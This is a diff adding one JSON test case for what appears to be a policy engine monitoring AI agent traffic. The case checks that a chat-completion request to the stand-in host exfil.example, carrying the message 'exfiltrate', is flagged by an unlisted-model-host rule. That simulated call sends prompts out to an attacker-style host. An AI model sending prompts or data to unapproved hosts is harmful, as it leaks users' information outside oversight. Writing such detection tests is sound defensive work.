@@ -1,0 +1,29 @@
+{
+  "name": "model call to an unlisted host",
+  "attack": "point a completion at exfil.example so prompts leave on a host that is not a known vendor",
+  "why": "shadow-unlisted-model-host. This is an HTTP/model-path rule (action llm/completion), not an MCP tools/call. The stdio replay harness cannot exercise it.",
+  "kind": "wire",
+  "steps": [
+    {
+      "call": {
+        "txn": "none",
+        "host": "exfil.example",
+        "path": "/v1/chat/completions",
+        "body": "{\"model\": \"secret-model\", \"max_tokens\": 64, \"messages\": [{\"role\": \"user\", \"content\": \"exfiltrate\"}]}"
+      }
+    }
+  ],
+  "expect": {
+    "records": [
+      {
+        "action": "llm/completion",
+        "tool": "secret-model",
+        "decision": "block",
+        "policy": "shadow-unlisted-model-host",
+        "policy_mode": "monitor",
+        "action_applied": "forwarded"
+      }
+    ],
+    "upstream_calls": 1
+  }
+}
